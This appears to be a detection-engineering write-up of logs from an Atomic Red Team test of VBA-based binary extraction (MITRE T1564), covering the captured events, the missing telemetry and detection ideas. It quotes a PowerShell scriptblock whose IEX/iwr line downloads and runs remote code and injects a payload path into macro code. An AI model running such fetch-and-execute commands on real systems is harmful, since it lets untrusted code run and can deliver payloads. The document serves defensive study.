# T1564-1: Hide Artifacts — Extract Binary Files via VBA

## Technique Context

MITRE ATT&CK T1564 (Hide Artifacts) covers techniques that conceal attacker-controlled
files, processes, or data from detection. This test uses a VBA macro embedded in a Word
document to extract a binary payload from an embedded resource and write it to disk. Hiding
a binary payload inside an Office document's VBA project, then extracting it at runtime,
is a common malware delivery pattern: the binary is not visible as a standalone file before
the document is opened, and file-based scanning may not detect it embedded within VBA.

The test uses the `Invoke-MalDoc` helper from the Atomic Red Team library, which automates
programmatic Word macro execution without requiring a live Office session.

## What This Dataset Contains

The PowerShell EID 4104 scriptblock log captures the full ART payload verbatim:

```powershell
$macro = [System.IO.File]::ReadAllText(
  "C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa",
  "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/
          atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
```

The subsequent EID 4104 block contains the full `Invoke-MalDoc` function source, downloaded
at runtime from `raw.githubusercontent.com` and compiled via `IEX`.

Sysmon EID 22 (DnsQuery) records the DNS lookup for `raw.githubusercontent.com` by an
unknown process (the process exited before Sysmon resolved its PID). Sysmon EID 3
(NetworkConnect) records an outbound HTTPS connection on port 443 by
`MsMpEng.exe` (Windows Defender) — Defender scanning the download, not the test itself.

Security EID 4688 records the process chain: the outer `powershell.exe` spawn with the
macro-injection command, plus `whoami.exe` (the ART pre-execution identity check).

## What This Dataset Does Not Contain (and Why)

No Sysmon EID 11 (FileCreate) for the extracted binary appears. The sysmon-modular file
creation rules target specific extensions and locations; `extractme.bin` written to the
`atomics\T1564\bin\` path was not matched. No Office process (WINWORD.EXE) appears in
process creation events — `Invoke-MalDoc` uses COM automation via PowerShell to drive Word
programmatically, and WINWORD.EXE was not captured by Sysmon's include-mode ProcessCreate
filter (Word is not in the LOLBin/suspicious-process list). No Sysmon ImageLoad events
for VBA engine DLLs appear.

Windows Defender's real-time protection was active; it may have blocked or quarantined
`extractme.bin` after extraction, but no EID 1117 (Malware detected) event is present
because the Defender operational channel is not collected in this dataset.

## Assessment

This dataset is notable for containing the full downloaded `Invoke-MalDoc` function body
in the PowerShell script block log — a consequence of `IEX` causing the downloaded code
to be logged before execution. This represents a detection opportunity created by the
technique itself: in-memory loading via `IEX` triggers script block logging that captures
the payload.

The DNS query for `raw.githubusercontent.com` and the subsequent Defender network scan
activity provide corroborating timeline evidence. Sysmon's minimal footprint (only 2 events)
reflects the include-mode filter design; Security and PowerShell logs carry the primary
forensic weight here.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: `IEX` (or `Invoke-Expression`) combined with `iwr`/`Invoke-WebRequest`
  fetching a `.ps1` file and a subsequent `Invoke-MalDoc` call — the downloaded function
  body appears in the script block log.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from `powershell.exe` context,
  especially when followed by `IEX` scriptblock logging.
- **Security EID 4688**: `powershell.exe` command line referencing `T1564-macrocode.txt` or
  `Invoke-MalDoc` or `extractme.bin`.
- **Behavioral**: `powershell.exe` reading a macro code file from disk, substituting a binary
  path placeholder, and loading a remote PS module via `IEX` in a single scriptblock is a
  characteristic VBA weaponization pattern regardless of the specific filenames involved.
